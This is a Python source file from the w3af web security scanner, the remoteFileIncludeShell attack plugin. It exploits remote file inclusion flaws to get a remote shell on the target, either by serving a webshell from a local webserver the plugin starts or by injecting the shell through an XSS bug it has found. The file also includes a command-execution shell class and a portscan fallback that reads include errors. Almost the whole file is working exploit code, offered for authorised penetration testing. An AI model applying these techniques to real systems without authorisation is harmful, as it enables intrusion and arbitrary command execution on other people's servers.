'''
remoteFileIncludeShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


# Common includes
from core.data.fuzzer.fuzzer import createRandAlNum
import core.controllers.outputManager as om

# options
from core.data.options.option import option
from core.data.options.optionList import optionList

from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
import core.data.kb.knowledgeBase as kb
import core.controllers.daemons.webserver as webserver
from core.controllers.w3afException import w3afException
from core.controllers.misc.homeDir import get_home_dir
from core.controllers.misc.get_local_ip import get_local_ip

# Advanced shell stuff
from core.data.kb.exec_shell import exec_shell as exec_shell
from core.data.kb.shell import shell as shell
import plugins.attack.payloads.shell_handler as shell_handler
from plugins.attack.payloads.decorators.exec_decorator import exec_debug

# Port definition
import core.data.constants.w3afPorts as w3afPorts

import os

NO_SUCCESS = 0
SUCCESS_COMPLETE = 1
SUCCESS_OPEN_PORT = 2


class remoteFileIncludeShell(baseAttackPlugin):
    '''
    Exploit remote file include vulnerabilities.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # Internal variables
        self._shell = None
        self._xss_vuln = None
        self._exploit_dc = None
        
        # User configured variables
        self._listen_port = w3afPorts.REMOTEFILEINCLUDE_SHELL
        self._listen_address = get_local_ip()
        self._use_XSS_vuln = True
        self._generateOnlyOne = True

    def fastExploit(self, url, method, data):
        '''
        Exploits a web app with remote file include vuln.
        
        @parameter url: A string containing the Url to exploit ( http://somehost.com/foo.php )
        @parameter method: A string containing the method to send the data ( post / get )
        @parameter data: A string containing data to send with a mark that defines
        which is the vulnerable parameter ( aa=notMe&bb=almost&cc=[VULNERABLE] )
        '''
        return self._shell
        
    def canExploit(self, vuln_to_exploit=None):
        '''
        Searches the kb for vulnerabilities that this plugin can exploit, this is overloaded from baseAttackPlugin because
        I need to test for xss vulns also. This is a "complex" plugin.

        @parameter vuln_to_exploit: The id of the vulnerability to exploit.
        @return: True if plugin knows how to exploit a found vuln.
        '''
        if not self._listen_address and not self._use_XSS_vuln:
            msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
            msg += ' that can be reached by the vulnerable Web application.'
            raise w3afException(msg)
        
        rfi_vulns = kb.kb.getData('remoteFileInclude' , 'remoteFileInclude')
        if vuln_to_exploit is not None:
            rfi_vulns = [v for v in rfi_vulns if v.getId() == vuln_to_exploit]
        
        if not rfi_vulns:
            return False
        else:

            #
            #    Ok, I have the RFI vulnerability to exploit, but... is the 
            #    plugin configured in such a way that exploitation is possible?
            #
            if self._use_XSS_vuln:
                
                xss_vulns = kb.kb.getData('xss', 'xss')

                if not xss_vulns:
                    msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
                    msg += ' exploit the RFI bug, but no XSS was found.'
                    om.out.console( msg )
                    
                else:                    
                    #
                    #    I have some XSS vulns, lets see if they have what we need
                    #
                    
                    for xss_vuln in xss_vulns:
                        # Set the test string
                        test_string = '<?#@!()&=?>'
                        
                        # Test if the current xss vuln works for us:
                        function_reference = getattr(self._urlOpener, xss_vuln.getMethod())
                        data_container = xss_vuln.getDc()
                        data_container[xss_vuln.getVar()] = test_string

                        try:
                            http_res = function_reference(xss_vuln.getURL(), str(data_container))
                        except:
                            continue
                        else:
                            if test_string in http_res.getBody():
                                self._xss_vuln = xss_vuln
                                return True
                    
                    # Check If I really got something nice that I can use to exploit
                    # if not, report it to the user
                    if not self._xss_vuln:
                        msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
                        msg += ' vulnerability to exploit the RFI, but no XSS with the required'
                        msg += ' capabilities was found.'
                        om.out.console( msg )

            #    Using the good old webserver (if properly configured)
            if not self._listen_address:
                msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
                msg += ' that can be reached by the vulnerable Web application.'
                raise w3afException(msg)

            return True
    
    def getAttackType(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''        
        return 'shell'
    
    def getVulnName2Exploit( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.osCommanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'osCommanding' , 'osCommanding', vuln )
        
        Then the exploit plugin that exploits osCommanding ( attack.osCommandingShell ) should
        return 'osCommanding' in this method.
        '''
        return 'remoteFileInclude'
        
    def _generateShell( self, vuln_obj ):
        '''
        @parameter vuln_obj: The vuln to exploit.
        @return: A shell object based on the vuln that is passed as parameter.
        '''
        # Check if we really can execute commands on the remote server
        exploit_success = self._verifyVuln( vuln_obj )
        if exploit_success == SUCCESS_COMPLETE:

            # Create the shell object
            shell_obj = rfi_shell( vuln_obj )
            shell_obj.setUrlOpener( self._urlOpener )
            shell_obj.set_cut( self._header_length, self._footer_length )
            shell_obj.setExploitDc( self._exploit_dc )
            return shell_obj
        
        elif exploit_success == SUCCESS_OPEN_PORT:

            # Create the portscan shell object
            shell_obj = portscan_shell( vuln_obj )
            shell_obj.setUrlOpener( self._urlOpener )
            return shell_obj

        else:
            return None

    def _verifyVuln(self, vuln):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        # Create the shell
        extension = vuln.getURL().getExtension()
        
        # I get a list of tuples with file_content and extension to use
        shell_list = shell_handler.get_webshells( extension )
        
        for file_content, real_extension in shell_list:
            #
            #    This for loop aims to exploit the RFI vulnerability and get remote
            #    code execution.
            #
            if extension == '':
                extension = real_extension

            url_to_include = self._gen_url_to_include(file_content, extension)

            # Start local webserver
            webroot_path = os.path.join(get_home_dir(), 'webroot')
            webserver.start_webserver(self._listen_address, self._listen_port,
                                      webroot_path)
            
            # Prepare for exploitation...
            function_reference = getattr(self._urlOpener, vuln.getMethod())
            data_container = vuln.getDc()
            data_container[vuln.getVar()] = url_to_include

            try:
                http_res = function_reference(vuln.getURL(), str(data_container))
            except:
                successfully_exploited = False
            else:
                successfully_exploited = self._define_exact_cut(
                                                http_res.getBody(),
                                                shell_handler.SHELL_IDENTIFIER)


            if successfully_exploited:
                self._exploit_dc = data_container
                return SUCCESS_COMPLETE
            else:
                # Remove the file from the local webserver webroot
                self._rm_file(url_to_include)
        
        else:
            
            #
            #    We get here when it was impossible to create a RFI shell, but we
            #    still might be able to do some interesting stuff
            #
            function_reference = getattr( self._urlOpener , vuln.getMethod() )
            data_container = vuln.getDc()
            
            #    A port that should "always" be closed,
            data_container[ vuln.getVar() ] = 'http://localhost:92/'   

            try:
                http_response = function_reference( vuln.getURL(), str(data_container) )
            except:
                return False
            else:
                rfi_errors = ['php_network_getaddresses: getaddrinfo',
                                    'failed to open stream: Connection refused in']
                for error in rfi_errors:
                    if error in http_response.getBody():
                        return SUCCESS_OPEN_PORT
                    
        return NO_SUCCESS
    
    def _gen_url_to_include( self, file_content, extension ):
        '''
        Generate the URL to include, based on the configuration it will return a 
        URL poiting to a XSS bug, or a URL poiting to our local webserver.
        '''
        if self._use_XSS_vuln and self._xss_vuln:
            url = self._xss_vuln.getURL().uri2url()
            data_container = self._xss_vuln.getDc()
            data_container = data_container.copy()
            data_container[self._xss_vuln.getVar()] = file_content
            url_to_include = url + '?' + str(data_container)
            return url_to_include
        else:
            # Write the php to the webroot
            filename = createRandAlNum()
            try:
                file_handler = open(os.path.join(get_home_dir(), 'webroot', filename) , 'w')
                file_handler.write(file_content)
                file_handler.close()
            except:
                raise w3afException('Could not create file in webroot.')
            else:
                url_to_include = 'http://' + self._listen_address +':'
                url_to_include += str(self._listen_port) +'/' + filename
                return url_to_include
    
    def _rm_file(self, url_to_include):
        '''
        Remove the file in the webroot.
        
        PLEASE NOTE: This is duplicated code!! see the same note above.
        '''
        if not self._use_XSS_vuln:
            # Remove the file
            filename = url_to_include.split('/')[-1:][0]
            os.remove(os.path.join(get_home_dir(), 'webroot', filename))

    
    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'IP address that the webserver will use to receive requests'
        h1 = 'w3af runs a webserver to serve the files to the target web app'
        h1 += ' when doing remote file inclusions. This setting configures on what IP address the'
        h1 += ' webserver is going to listen.'
        o1 = option('listenAddress', self._listen_address, d1, 'string', help=h1)

        d2 = 'Port that the webserver will use to receive requests'
        h2 = 'w3af runs a webserver to serve the files to the target web app'
        h2 += ' when doing remote file inclusions. This setting configures on what IP address'
        h2 += ' the webserver is going to listen.'
        o2 = option('listenPort', self._listen_port, d2, 'integer', help=h2)
        
        d3 = 'Instead of including a file in a local webserver; include the result of'
        d3 += ' exploiting a XSS bug.'
        o3 = option('useXssBug', self._use_XSS_vuln, d3, 'boolean')
        
        d4 = 'If true, this plugin will try to generate only one shell object.'
        o4 = option('generateOnlyOne', self._generateOnlyOne, d4, 'boolean')
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptions().
        
        @parameter optionsMap: A map with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._listen_address = optionsMap['listenAddress'].getValue()
        self._listen_port = optionsMap['listenPort'].getValue()
        self._use_XSS_vuln = optionsMap['useXssBug'].getValue()
        self._generateOnlyOne = optionsMap['generateOnlyOne'].getValue()
        
        if self._listen_address == '' and not self._use_XSS_vuln:
            om.out.error('remoteFileIncludeShell plugin has to be correctly configured to use.')
            return False
            
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
    
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits remote file inclusion vulnerabilities and returns a remote shell. The 
        exploitation can be done using a more classic approach, in which the file to be included 
        is hosted on a webserver that the plugin runs, or a nicer approach, in which a XSS bug on 
        the remote site is used to generate the remote file to be included. Both ways work and 
        return a shell, but the one that uses XSS will work even when a restrictive firewall is 
        configured at the remote site.
        
        Four configurable parameters exist:
            - listenAddress
            - listenPort
            - useXssBug
            - generateOnlyOne
        '''


class portscan_shell(shell):
    '''
    I create this shell when for some reason I was unable to create the rfi_shell,
    AND the "include()" method is showing errors, allowing me to determine if a
    port is open or not. 
    '''
    def __init__(self, vuln):
        '''
        Create the obj
        '''
        shell.__init__(self, vuln)
        
    def is_open_port(self, host, port):
        '''
        @return: True if the host:port is open.
        '''
        port_open_dc = self.getDc()
        port_open_dc = port_open_dc.copy()
        port_open_dc[ self.getVar() ] = 'http://%s:%s/' % (host, port)
                
        function_reference = getattr( self._urlOpener , self.getMethod() )
        try:
            http_response = function_reference( self.getURL(), str(port_open_dc) )
        except w3afException, w3:
            return 'Exception from the remote web application: "%s"' % w3
        except Exception, e:
            return 'Unhandled exception, "%s"' % e
        else:
            if 'HTTP request failed!' in http_response.getBody():
                #    The port is open but it's not an HTTP daemon
                return True
            elif 'failed to open stream' not in http_response.getBody():
                #    Open port, AND HTTP daemon
                return True
            else:
                return False

    def getName(self):
        return 'portscan-shell object'
        
class rfi_shell(exec_shell):
    '''
    I create this shell when the remote host allows outgoing connections, or when
    the attack plugin was configured to use XSS vulnerabilities to exploit the RFI and
    a XSS vulnerability was actually found.
    '''
    def __init__(self, vuln):
        '''
        Create the obj
        '''
        exec_shell.__init__(self, vuln)
        self._exploit_dc = None
    
    def setExploitDc(self, e_dc):
        '''
        Save the exploit data container, that holds all the parameters for a successful exploitation
        
        @parameter e_dc: The exploit data container.
        '''
        self._exploit_dc = e_dc
    
    def getExploitDc(self):
        '''
        Get the exploit data container.
        '''
        return self._exploit_dc
    
    @exec_debug
    def execute(self, command):
        '''
        This method is called when a user writes a command in the shell and hits enter.
        
        Before calling this method, the framework calls the generic_user_input method
        from the shell class.

        @parameter command: The command to handle ( ie. "read", "exec", etc ).
        @return: The result of the command.
        '''
        e_dc = self.getExploitDc()
        e_dc = e_dc.copy()
        e_dc['cmd'] = command
        
        function_reference = getattr(self._urlOpener, self.getMethod())
        try:
            http_res = function_reference(self.getURL(), str(e_dc))
        except w3afException, w3:
            return 'Exception from the remote web application:' + str(w3)
        except Exception, e:
            return 'Unhandled exception from the remote web application:' + str(e)
        else:
            return self._cut( http_res.getBody())
        
    def end(self):
        '''
        Finish execution, clean-up, remove file.
        '''
        om.out.debug('Remote file inclusion shell is cleaning up.')
        try:
            self._rm_file(self.getExploitDc()[self.getVar()])
        except Exception, e:
            om.out.error('Remote file inclusion shell cleanup failed with exception: ' + str(e))
        else:
            om.out.debug('Remote file inclusion shell cleanup complete.')
    
    def getName(self):
        return 'rfi_shell'

    def _rm_file(self, url_to_include):
        '''
        Remove the file in the webroot.
        
        PLEASE NOTE: This is duplicated code!! see the same note above.
        '''
        # Remove the file
        filename = url_to_include.split('/')[-1:][0]
        os.remove(os.path.join(get_home_dir(), 'webroot', filename))
            
